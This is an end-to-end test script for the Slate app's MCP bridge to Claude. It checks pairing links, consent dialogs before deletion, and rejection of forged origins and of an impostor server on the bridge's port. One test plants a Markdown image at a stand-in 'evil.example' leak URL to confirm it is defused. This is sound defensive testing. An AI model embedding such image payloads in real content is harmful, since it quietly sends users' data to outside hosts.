// The MCP bridge end to end: this script plays the MCP client (what Claude Desktop or
// Claude Code would be), the real bridge program runs, and a real Slate tab does the work.
// Usage: npm run build && npm start, then: node e2e/mcp.mjs [url] [screenshotDir]
import { chromium } from "playwright";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";

const base = process.argv[2] ?? "http://localhost:5183/";
const shots = process.argv[3];
const PORT = 47811;
const origin = new URL(base).origin;
// its own secret, so the test never touches the pairing of the person's real bridge
const env = { ...process.env, SLATE_MCP_PORT: String(PORT), SLATE_ORIGINS: origin, SLATE_URL: base, SLATE_MCP_SECRET_FILE: path.join(fs.mkdtempSync(path.join(os.tmpdir(), "slate-mcp-")), "secret") };
const CODE = /([0-9A-F]{4}-){3}[0-9A-F]{4}/.exec(spawnSync(process.execPath, ["public/slate-mcp.mjs", "pair"], { env, encoding: "utf8" }).stdout)[0];
const LINK = base + "#/pair/" + CODE;

/** Start a copy of the bridge and talk JSON-RPC to it over its stdin/stdout. */
function client() {
  const child = spawn(process.execPath, ["public/slate-mcp.mjs"], { env, stdio: ["pipe", "pipe", "ignore"] });
  const pending = new Map();
  let buffer = "";
  let next = 1;
  child.stdout.setEncoding("utf8");
  child.stdout.on("data", (chunk) => {
    buffer += chunk;
    for (let at = buffer.indexOf("\n"); at >= 0; at = buffer.indexOf("\n")) {
      const msg = JSON.parse(buffer.slice(0, at));
      buffer = buffer.slice(at + 1);
      pending.get(msg.id)?.(msg);
      pending.delete(msg.id);
    }
  });
  const request = (method, params) =>
    new Promise((resolve) => {
      const id = next++;
      pending.set(id, resolve);
      child.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n");
    });
  return {
    request,
    /** call a tool; resolves to { text, isError, data } */
    async tool(name, args = {}) {
      const { result, error } = await request("tools/call", { name, arguments: args });
      if (error) return { rpcError: error };
      const text = result.content[0].text;
      let data = null;
      try {
        data = JSON.parse(text);
      } catch {
        /* a plain message */
      }
      return { text, isError: result.isError, data };
    },
    stop: () => child.kill(),
  };
}

const step = async (name, fn) => {
  try {
    await fn();
    console.log("ok   " + name);
  } catch (e) {
    console.log("FAIL " + name + "\n     " + String(e.message).split("\n").slice(0, 4).join(" | "));
    process.exitCode = 1;
  }
};

const claude = client();
// the test has no person to click the browser's "allow local network" prompt
const browser = await chromium.launch({ channel: "msedge", args: ["--disable-features=LocalNetworkAccessChecks"] });
const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 }, locale: "zh-TW" });
await ctx.addInitScript((url) => localStorage.setItem("slate:bridge", url), "http://127.0.0.1:" + PORT);
const page = await ctx.newPage();
page.setDefaultTimeout(15_000);
const errors = [];
page.on("pageerror", (e) => errors.push(e.message));
page.on("console", (m) => m.type() === "error" && errors.push(m.text()));
const store = (table) =>
  page.evaluate(
    (table) =>
      new Promise((res) => {
        const o = indexedDB.open("slate-workspace");
        o.onsuccess = () => {
          const q = o.result.transaction(table).objectStore(table).getAll();
          q.onsuccess = () => (o.result.close(), res(q.result));
        };
      }),
    table,
  );

await page.goto(base);
await page.waitForSelector(".page-title");

await step("the bridge introduces itself and lists the same tools the app has", async () => {
  const init = await claude.request("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "test", version: "1" } });
  assert.equal(init.result.serverInfo.name, "slate");
  assert.equal(init.result.protocolVersion, "2025-06-18");
  assert.match(init.result.instructions, /Slate workspace/);
  const { tools } = (await claude.request("tools/list")).result;
  assert.ok(tools.length >= 13);
  // asking to connect gets a link to click, not a command to run
  const connect = (await claude.tool("slate_connect")).text;
  assert.ok(connect.includes(LINK));
  assert.ok(connect.includes("ending in " + CODE.slice(-4))); // so the person can compare with Slate's question
  assert.deepEqual(tools.filter((t) => t.annotations?.destructiveHint).map((t) => t.name).sort(), ["delete_task", "trash_page"]);
  assert.ok(tools.every((t) => t.inputSchema.type === "object" && t.description.length > 30));
  assert.deepEqual((await claude.request("ping")).result, {});
});

await step("while Slate has not allowed it, a call explains what the person must switch on", async () => {
  const r = await claude.tool("list_tasks");
  assert.equal(r.isError, true);
  assert.match(r.text, /Slate is not connected yet/);
  assert.ok(r.text.includes(LINK)); // and hands over the link that fixes it
});

await step("the settings offer one download to double-click, and no commands", async () => {
  await page.locator(".sidebar .nav-row", { hasText: "AI 助理" }).click();
  await page.locator(".ai-setup .seg-btn", { hasText: "Claude 訂閱" }).click();
  assert.equal(await page.locator(".ai-setup .btn.primary >> text=儲存").isVisible(), false); // nothing to "save" on this tab
  const href = await page.locator(".ai-steps a.btn[download]").getAttribute("href");
  assert.equal(href, "slate.mcpb");
  const file = Buffer.from(await (await fetch(new URL(href, base))).arrayBuffer());
  assert.equal(file.subarray(0, 2).toString(), "PK"); // a real archive, not the app's page
  assert.ok(file.includes(Buffer.from("manifest.json")));
  // the command line is there for those who want it, but folded away
  assert.equal(await page.locator(".ai-advanced").getAttribute("open"), null);
  assert.equal(await page.locator(".ai-advanced code").first().isVisible(), false);
  if (shots) await page.screenshot({ path: shots + "/mcp-00-setup.png" });
});

await step("a link the person refuses connects nothing", async () => {
  const other = await ctx.newPage();
  other.once("dialog", (d) => void d.dismiss());
  await other.goto(LINK);
  await other.waitForSelector(".page-title, .home");
  assert.equal(await other.evaluate(() => localStorage.getItem("ai-bridge")), null);
  assert.ok(!(await other.evaluate(() => location.hash)).includes("pair")); // the code does not linger in the address
  await other.close();
  assert.match((await claude.tool("list_tasks")).text, /Slate is not connected yet/);
});

await step("a made-up link is not believed even when the person says yes", async () => {
  // anyone can write such a link; nothing on this computer holds this code
  const other = await ctx.newPage();
  other.once("dialog", (d) => void d.accept());
  await other.goto(base + "#/pair/0123-4567-89AB-CDEF");
  await other.waitForSelector(".toast >> text=沒有連上");
  assert.equal(await other.evaluate(() => localStorage.getItem("ai-bridge")), null);
  assert.equal(await other.evaluate(() => localStorage.getItem("ai-bridge-code")), null);
  await other.close();
});

await step("opening the link Claude gave, and saying yes, is all it takes to connect", async () => {
  let asked = "";
  page.once("dialog", (d) => {
    asked = d.message();
    void d.accept();
  });
  await page.goto(LINK); // this tab already shows Slate: the link takes effect without a reload
  await page.waitForSelector(".page-title, .home");
  assert.match(asked, /要讓這台電腦上的 Claude 連進這個 Slate 嗎/);
  assert.ok(asked.includes("配對碼末四碼：" + CODE.slice(-4)));
  assert.ok(!asked.includes("注意"));
  await page.waitForSelector(".toast >> text=已連接 Claude");
  // no code typed, no switch found: the settings simply show it as connected
  await page.locator(".ai-setup .seg-btn", { hasText: "Claude 訂閱" }).click();
  await page.waitForSelector(".ai-bridge-state.connected");
  assert.equal(await page.locator(".ai-steps").count(), 0);
  if (shots) await page.screenshot({ path: shots + "/mcp-01-connected.png" });
});

let taskId = "";
await step("Claude adds and reads tasks in the real workspace", async () => {
  const added = await claude.tool("add_task", { title: "從 Claude 來的任務", due: "2030-02-03", list: "工作" });
  assert.equal(added.isError, false);
  taskId = added.data.id;
  const stored = (await store("tasks")).find((t) => t.id === taskId);
  assert.deepEqual([stored.title, stored.due], ["從 Claude 來的任務", "2030-02-03"]);
  await page.waitForSelector(".toast >> text=Claude：新增任務「從 Claude 來的任務」"); // the person sees what was done
  const listed = await claude.tool("list_tasks", { list: "工作" });
  assert.deepEqual(listed.data.tasks.map((t) => t.title), ["從 Claude 來的任務"]);
});

await step("Claude writes a page with Markdown, and a remote picture in it is defused", async () => {
  const made = await claude.tool("create_page", { title: "Claude 寫的頁面", markdown: "## 重點\n\n- 一\n- 二\n\n![x](https://evil.example/leak.png?d=1)" });
  const read = await claude.tool("read_page", { id: made.data.id });
  assert.match(read.data.content, /## 重點/);
  const stored = JSON.stringify((await store("pages")).find((p) => p.id === made.data.id).content);
  assert.ok(!stored.includes('"type":"image"'));
  assert.ok(stored.includes("https://evil.example/leak.png?d=1")); // kept, as a link only
});

await step("bad calls are answered, not executed", async () => {
  const bad = await claude.tool("add_task", { due: "soon" });
  assert.equal(bad.isError, true);
  assert.match(bad.text, /Invalid input: missing "title"/);
  assert.equal((await claude.tool("nope")).rpcError.code, -32602);
});

await step("deleting asks the person in the Slate tab: no means no, yes means yes", async () => {
  let asked = "";
  page.once("dialog", (d) => {
    asked = d.message();
    void d.dismiss();
  });
  const refused = await claude.tool("delete_task", { id: taskId });
  assert.match(asked, /Claude 想要永久刪除任務「從 Claude 來的任務」/);
  assert.equal(refused.isError, true);
  assert.match(refused.text, /declined/);
  assert.ok((await store("tasks")).some((t) => t.id === taskId));

  page.once("dialog", (d) => void d.accept());
  const done = await claude.tool("delete_task", { id: taskId });
  assert.equal(done.data.deleted, true);
  assert.ok(!(await store("tasks")).some((t) => t.id === taskId));
});

await step("a second Claude app on the same computer shares the bridge", async () => {
  const other = client();
  await other.request("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "other", version: "1" } });
  const added = await other.tool("add_task", { title: "第二個程式加的" });
  assert.equal(added.isError, false);
  assert.ok((await store("tasks")).some((t) => t.title === "第二個程式加的"));
  other.stop();
});

await step("other websites and other programs cannot use the bridge", async () => {
  const url = "http://127.0.0.1:" + PORT;
  // a page on another site: refused before anything is read
  assert.equal((await fetch(url + "/poll", { headers: { origin: "https://evil.example" } })).status, 403);
  // the right site without the pairing code gets no work either
  assert.equal((await fetch(url + "/poll?t=" + Date.now() + "&m=" + "0".repeat(64), { headers: { origin } })).status, 401);
  assert.equal((await fetch(url + "/result", { method: "POST", headers: { origin, "content-type": "application/json" }, body: JSON.stringify({ id: "x", text: "forged", t: Date.now(), m: "0".repeat(64) }) })).status, 401);
  assert.equal((await fetch(url + "/result", { method: "POST", headers: { origin: "https://evil.example", "content-type": "application/json" }, body: "{}" })).status, 403);
  assert.equal((await fetch(url + "/poll")).status, 403); // no origin at all
  // the door for sibling copies needs the secret from the person's home folder, and no web page may use it
  assert.equal((await fetch(url + "/call", { method: "POST", headers: { "content-type": "application/json" }, body: '{"name":"list_tasks","input":{}}' })).status, 403);
  assert.equal((await fetch(url + "/call", { method: "POST", headers: { "x-slate-mcp": Date.now() + "." + "0".repeat(64), "content-type": "application/json" }, body: "{}" })).status, 403);
});

await step("a program squatting on the port cannot make Slate do anything", async () => {
  // it answers like a bridge and hands out a call, but cannot sign with the pairing code
  const got = [];
  const impostor = http.createServer((req, res) => {
    got.push(req.url);
    const cors = { "access-control-allow-origin": origin, "access-control-allow-headers": "content-type", "access-control-allow-private-network": "true" };
    if (req.method === "OPTIONS") return void res.writeHead(204, cors).end();
    const body = req.url.startsWith("/hello") ? { mac: "f".repeat(64) } : { id: "1", name: "add_task", args: '{"title":"冒牌貨加的"}', mac: "f".repeat(64) };
    res.writeHead(200, { ...cors, "content-type": "application/json" }).end(JSON.stringify(body));
  });
  await new Promise((r) => impostor.listen(PORT + 1, "127.0.0.1", r));
  const victimCtx = await browser.newContext({ locale: "zh-TW" });
  await victimCtx.addInitScript(
    ([url, code]) => {
      localStorage.setItem("slate:bridge", url);
      localStorage.setItem("ai-bridge", "1");
      localStorage.setItem("ai-bridge-code", code);
    },
    ["http://127.0.0.1:" + (PORT + 1), CODE],
  );
  const victim = await victimCtx.newPage();
  await victim.goto(base);
  await victim.waitForSelector(".page-title");
  await victim.waitForTimeout(7000); // long enough for a couple of attempts
  assert.ok(got.some((u) => u.startsWith("/hello")), "the tab never knocked");
  assert.ok(!got.some((u) => u.startsWith("/poll")), "the tab asked an unproven program for work");
  const tasks = await victim.evaluate(
    () =>
      new Promise((res) => {
        const o = indexedDB.open("slate-workspace");
        o.onsuccess = () => {
          const q = o.result.transaction("tasks").objectStore("tasks").getAll();
          q.onsuccess = () => (o.result.close(), res(q.result.map((t) => t.title)));
        };
      }),
  );
  assert.ok(!tasks.includes("冒牌貨加的"));
  await victimCtx.close();
  impostor.close();
});

await step("a link with a different code cannot quietly replace the pairing", async () => {
  const other = await ctx.newPage();
  let asked = "";
  other.once("dialog", (d) => {
    asked = d.message();
    void d.accept(); // even a careless yes
  });
  await other.goto(base + "#/pair/FEDC-BA98-7654-3210");
  await other.waitForSelector(".toast >> text=沒有連上");
  assert.match(asked, /^注意：這個 Slate 已經和這台電腦上的 Claude 配對過/);
  assert.equal(await other.evaluate(() => localStorage.getItem("ai-bridge-code")), CODE); // the real pairing stands
  await other.close();
  assert.equal((await claude.tool("list_tasks")).isError, false); // and still works
});

await step("with Slate open in two tabs, every call is still answered exactly once", async () => {
  const second = await ctx.newPage();
  await second.goto(base);
  await second.waitForSelector(".page-title, .home");
  await second.waitForTimeout(1500); // both tabs are now waiting for work
  const before = (await store("tasks")).length;
  for (let n = 0; n < 6; n++) assert.equal((await claude.tool("add_task", { title: "兩個分頁 " + n })).isError, false);
  assert.equal((await store("tasks")).length, before + 6);
  await second.close();
  // the tab that is left carries on at once
  const started = Date.now();
  assert.equal((await claude.tool("list_tasks")).isError, false);
  assert.ok(Date.now() - started < 5000, "a call waited on a tab that had closed");
});

await step("switching it off stops the tab from listening", async () => {
  await page.locator(".ai-mcp .btn", { hasText: "中斷與 Claude 的連接" }).click();
  await page.waitForSelector(".ai-steps"); // back to the two steps
  await page.waitForTimeout(500);
  const r = await claude.tool("list_tasks");
  assert.equal(r.isError, true);
  assert.match(r.text, /Slate is not connected/);
  assert.equal(await page.evaluate(() => localStorage.getItem("ai-bridge")), null);
});

await step("no console errors", async () => {
  for (const e of errors.slice(0, 3)) console.log("     " + e.slice(0, 500));
  assert.deepEqual(errors, []);
});

await browser.close();
claude.stop();
process.exit(process.exitCode ?? 0);
